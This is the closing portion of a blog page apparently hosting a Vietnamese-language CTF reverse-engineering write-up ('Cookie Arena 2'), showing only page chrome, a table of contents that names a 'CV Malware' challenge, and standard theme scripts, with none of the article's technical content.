</span></span></code></pre></div>
      
    </div>
    <footer class="article-footer">
      
        






<blockquote class="article-copyright">
  
    <p><strong><span class="icon-user icon"></span>Author: </strong>Spid3r @ Adventures of Spid3r</p>
  
  
  
  
    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2023-07-09 11:00:00</p>
  
  
  
    <p>
      <strong><span class="icon-copyright icon"></span>License: </strong>
      All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener external nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!
    </p>
    <span class="icon-creative-commons article-copyright-bg"></span>
  
</blockquote>

      

      
        <div class="sponsor-wrapper">
  <div class="sponsor-button-wrapper">
    <div class="sponsor-icon rotate"></div>
    <div class="sponsor-title">Sponsor</div>
    <div class="sponsor-icon rotate"></div>
  </div>
  <div class="sponsor-tip">Buy the author a coffee!</div>
  
    <div class="sponsor-qr">
      
        <div class="sponsor-qr-image-wrapper">
          <img src="/images/bmc_qr.png" alt="buymeacoffee.com/spid3r" width="200" />
          <p class="sponsor-qr-name">buymeacoffee.com/spid3r</p>
        </div>
      
    </div>
  
</div>
      

      

      

      

      

      

      
      <ul class="article-tag-list" itemprop="keywords">
  
    <li class="article-tag-list-item" data-aos="zoom-in">
      <a
        class="article-tag-list-link"
        href="/tags/reverse-engineering"
        rel="tag"
        >REVERSE ENGINEERING</a
      >
    </li>
  
    <li class="article-tag-list-item" data-aos="zoom-in">
      <a
        class="article-tag-list-link"
        href="/tags/writeups"
        rel="tag"
        >WRITEUPS</a
      >
    </li>
  
</ul>

    </footer>
  </div>
  
    
  <nav
    id="article-nav"
    data-aos="fade-up"
  >
    
      <div class="article-nav-link-wrap article-nav-link-left">
        
          <img
            data-src="/images/writeups-forensics-umdctf/featured.png"
            data-sizes="auto"
            alt="UMDCTF 2023 | Digital Forensics"
            class="lazyload"
          />
        
        <a href="https://sondt1337.github.io/post/writeups-forensics-umdctf/"></a>
        <div class="article-nav-caption">Newer</div>
        <h3 class="article-nav-title">
          
            UMDCTF 2023 | Digital Forensics
          
        </h3>
      </div>
    

    
      <div class="article-nav-link-wrap article-nav-link-right">
        
          <img
            data-src="/images/sekaictf-re/featured-image.png"
            data-sizes="auto"
            alt="SekaiCTF 2023 | Reverse Engineering"
            class="lazyload"
          />
        
        <a href="https://sondt1337.github.io/post/sekaictf-re/"></a>
        <div class="article-nav-caption">Older</div>
        <h3 class="article-nav-title">
          
            SekaiCTF 2023 | Reverse Engineering
          
        </h3>
      </div>
    
  </nav>


  
</article>










</section>
        </div>
        
        
        



  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  



<footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    
      <div style="flex-direction:column;align-items: center;"><a rel="license" href="http://creativecommons.org/licenses/by/4.0/"></a>
    
    <div>
      <span class="icon-copyright"></span>
      2021 -
      2025
      <span class="footer-info-sep rotate"></span>
      Spid3r
    </div>
    
      <div>
        <span class="icon-brush"
          >&nbsp;
            19.8k
          </span
        >
        &nbsp;|&nbsp;
        <span class="icon-coffee">&nbsp;
          
          

          01:40
        </span>
      </div>
    
    
    
    
      <div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv"
          >Number of visits&nbsp;<span
            id="busuanzi_value_site_pv"
          ></span
        ></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv"
          >Number of visitors&nbsp;<span
            id="busuanzi_value_site_uv"
          ></span
        ></span>
      </div>
    
  </div>
</footer>

        
          <div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div>
        
        <div id="mask" class="hide"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      
        <div class="sidebar-toc-sidebar">
          <div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#pyreverse">Pyreverse</a></li>
    <li><a href="#jump">Jump</a>
      <ul>
        <li><a href="#phân-tích-file">Phân tích file</a></li>
        <li><a href="#tìm-địa-chỉ-_flag-và-lấy-flag">Tìm địa chỉ <code>_flag</code> và lấy flag</a></li>
      </ul>
    </li>
    <li><a href="#rev1">Rev1</a>
      <ul>
        <li><a href="#phân-tích-file-1">Phân tích file</a></li>
        <li><a href="#winmain">WinMain</a></li>
        <li><a href="#debug">Debug</a></li>
      </ul>
    </li>
    <li><a href="#cv-malware">CV Malware</a>
      <ul>
        <li><a href="#phân-tích-file-2">Phân tích file</a></li>
        <li><a href="#unzip--check">Unzip &amp; check</a></li>
        <li><a href="#decode">Decode</a></li>
        <li><a href="#clientexe">client.exe</a></li>
        <li><a href="#bắt-tương-tác-giữa-client-với-host-thông-qua-wireshark">Bắt tương tác giữa client với host thông qua Wireshark</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
        </div>
        <div class="sidebar-common-sidebar hidden">
          
<div class="sidebar-author">
  <img
    data-src="/avatar/../images/avatar.jpg"
    data-sizes="auto"
    alt="Spid3r"
    class="lazyload"
  />
  <div class="sidebar-author-name">Spid3r</div>
  <div class="sidebar-description">I&#39;m a little spider</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    
    <div class="sidebar-state-number">11</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">
      1
    </div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">4</div>
  </div>
</div>
<div class="sidebar-social">
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe632;
        
      </div>
      <div class="sidebar-menu-link">Home</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe604;
        
      </div>
      <div class="sidebar-menu-link">Archives</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/about"
        aria-label="About"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe628;
        
      </div>
      <div class="sidebar-menu-link">About</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/achievements"
        aria-label="Achievements"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe621;
        
      </div>
      <div class="sidebar-menu-link">Achievements</div>
    </div>
  
</div>

        </div>
      
    
  </div>
  
    
      <div class="sidebar-btn-wrapper">
        <div class="sidebar-toc-btn current"></div>
        <div class="sidebar-common-btn"></div>
      </div>
    
  
</nav>

    </div>
    
      <div class="site-search">
        <div class="reimu-popup popup">
          <div class="reimu-search">
            <div class="reimu-search-input-icon"></div>
            <div class="reimu-search-input" id="reimu-search-input"></div>
            <div class="popup-btn-close"></div>
          </div>
          <div class="reimu-results">
            <div id="reimu-stats"></div>
            <div id="reimu-hits"></div>
            <div id="reimu-pagination" class="reimu-pagination"></div>
          </div>
          <img class="reimu-bg" src="/images/reimu.png" />
        </div>
      </div>
    
    






  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
    
    
    
    
    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"
  ></script>




  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
    
    
    
    
    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"
  ></script>









  
      
      <script src="/js/main.js" integrity="" crossorigin="anonymous" ></script>
      



  





  
      
      <script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script>
      

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", aosInit);
    } else {
      aosInit();
    }
  </script>








  
      
      <script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script>
      



  <script>
    var ALGOLIA_CONFIG = {
      logo: '\/images\/algolia_logo.svg',
      algolia: {
        applicationID: "",
        apiKey: "",
        indexName: "",
        hits: {
          "per_page": parseInt("10")
        },
        labels: {
          "input_placeholder": "搜索.....",
          "hits_empty": "未发现与 「${query}」相关内容",
          "hits_stats": "找到${hits}条结果（用时 ${time} ms）"
        }
      }
    };
  </script>
  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
    defer
    
    
    
    integrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"
  ></script>


  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/instantsearch.js@4.56.1/dist/instantsearch.production.min.js"
    defer
    
    
    
    integrity="sha384-hHJCflT4KBLQyHfKO9vpstIcFKn/Y&#43;KHTORelMMEn7mOp2AVPp&#43;7fr03dLgZiV3J" crossorigin="anonymous"
  ></script>


  





  
      
      <script src="/js/algolia_search.js" integrity="" crossorigin="anonymous" ></script>
      




  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/mouse-firework@0.1.0/dist/index.umd.js"
    
    
    
    
    integrity="sha384-KM6i7tu43nYd6e0beIljxHMC5tZc58XBDu7pPA58w50h18Jsx7gLdimfS09RXlKv" crossorigin="anonymous"
  ></script>


<script>
  if (window.firework) {
    const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"#ff5252\",\"#ff7c7c\",\"#ffafaf\",\"#ffd0d0\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"#ff0000\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
    options.excludeElements = options.excludeelements;
    delete options.excludeelements;
    window.firework(options);
  }
</script>



  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/theme-shokax-pjax@0.0.3/dist/index.umd.js"
    
    
    
    
    integrity="sha384-xneY1WY8hOfUzswrE4CrYq35N4BdVcxqxwHPr9zawE/jMSCxD&#43;jAPU55x/jj3wlf" crossorigin="anonymous"
  ></script>


  <script>
    function loadScripts(scripts, index) {
      if (index < scripts.length) {
        const script = scripts[index];
        const src = script.getAttribute('src');

        const loadScript = (scriptContent) => {
          return new Promise((resolve, reject) => {
            const scriptElement = document.createElement('script');
            if (script.type) {
              scriptElement.type = script.type;
            }
            if (script.src) {
              scriptElement.src = script.src;
              scriptElement.onload = resolve;
              scriptElement.onerror = reject;
            }
            if (scriptContent) {
              scriptElement.text = scriptContent;
            }
            document.head.appendChild(scriptElement);
            if (!script.src) {
              resolve();
            }
          })
          
        }

        ;(src ? loadScript() : loadScript(script.text))
          .then(() => loadScripts(scripts, index + 1))
          .catch(error => {
            console.error(`Failed to load script: ${src || 'inline script'}`, error);
            loadScripts(scripts, index + 1);
          });
      }
    }
    window.Pjax &&
      new window.Pjax({
        selectors: [
          "#header>img",
          "#header>picture",
          "head title",
          "#header-title",
          "#subtitle-wrap",
          "#main",
          "#content",
          ".sidebar-widget",
          ".sidebar-wrapper",
          "#mobile-nav",
          "#lazy-script",
        ],
        switches: {
          "#content": function(oldEl, newEl) {
            
            oldEl.className = newEl.className;
            this.onSwitch();
          },
          "#header-title": Pjax.switches.outerHTML,
          "#subtitle-wrap": Pjax.switches.outerHTML,
          "#main": function (oldEl, newEl) {
            const scripts = [...newEl.querySelectorAll("script")];
            loadScripts(scripts, 0);
            oldEl.outerHTML = newEl.outerHTML;
            this.onSwitch();
          },
          "#mobile-nav": Pjax.switches.outerHTML,
          "#lazy-script": function (oldEl, newEl) {
            const scripts = [...newEl.querySelectorAll("script")];
            loadScripts(scripts, 0);
            oldEl.innerHTML = newEl.innerHTML;
            this.onSwitch();
          },
        },
        cacheBust: false,
      });
  </script>
  





  
      
      <script src="/js/pjax.js" integrity="" crossorigin="anonymous" ></script>
      







<div id="lazy-script">
  <div>
    
      
      
        
      
      <script data-pjax>
        window.REIMU_POST = {
          author: "Spid3r",
          title: "Cookie Arena 2 | Reverse Engineering",
          url: "https:\/\/sondt1337.github.io\/post\/cookie-arena-2\/",
          description: "Clear Reverse Engineering giải Cookie Arena mùa 2",
          cover: "https:\/\/sondt1337.github.io\/images\/cookie_arena_2\/featured.png",
        };
      </script>
    
    
    
      





  
      
      <script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script>
      

      
      
      
      
      <script type="module" data-pjax>
        const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;

        const pswp = () => {
          if (_$$('.article-entry a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-entry',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
            }).init();
          }
          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-gallery',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
            }).init();
          }
          window.lightboxStatus = 'done';
          window.removeEventListener('lightbox:ready', pswp);
        }
        if(window.lightboxStatus === 'ready') {
          pswp()
        } else {
          window.addEventListener('lightbox:ready', pswp);
        }
      </script>
      












      
    
    
  </div>
</div>




  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
    
    async
    
    
    integrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"
  ></script>





  





  
       
         
      

  





  
      
      <script src="/js/service_worker.js" integrity="" crossorigin="anonymous" ></script>
      




  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.js"
    
    
    
    
    integrity="sha384-gdGYZwHnfJM54evoZhpO0s6ZF5BQiybkiyW7VXr&#43;h5UfruuRL/aORyw&#43;5&#43;HZoU6e" crossorigin="anonymous"
  ></script>


  
    <script>
      const ap = new APlayer({
          theme: "var(--color-link)",
          container: document.getElementById('aplayer'),
          audio: JSON.parse("[{\"artist\":\"Miki Matsubara\",\"cover\":\"/images/song_covers/Mayonaka_no_Door_Stay_With_Me.jpg\",\"lrc\":\"/songs/Mayonaka_no_Door_Stay_With_Me.lrc\",\"name\":\"Mayonaka no Door / Stay With Me\",\"url\":\"/songs/Mayonaka_no_Door_Stay_With_Me.mp3\"},{\"artist\":\"Tomoko Aran\",\"cover\":\"/images/song_covers/Midnight Pretenders.jpg\",\"lrc\":\"/songs/Midnight Pretenders.lrc\",\"name\":\"Midnight Pretenders\",\"url\":\"/songs/Midnight Pretenders.mp3\"},{\"artist\":\"Spectrum\",\"cover\":\"/images/song_covers/F・L・Y.jpg\",\"lrc\":\"/songs/F・L・Y.lrc\",\"name\":\"F・L・Y\",\"url\":\"/songs/F・L・Y.mp3\"},{\"artist\":\"Yoko Oginome\",\"cover\":\"/images/song_covers/LAZY DANCE.jpg\",\"lrc\":\"/songs/LAZY DANCE.lrc\",\"name\":\"LAZY DANCE\",\"url\":\"/songs/LAZY DANCE.mp3\"}]") || [],
          fixed:  null  || false,
          autoplay:  false  || false,
          loop: 'all' || 'all',
          order: '' || 'list',
          preload: '' || 'auto',
          volume:  null  || 0.7,
          mutex:  null  || true,
          listFolded:  false  || false,
          lrcType:  3  || 0,
      });
    </script>
  





    
  </body>
</html>
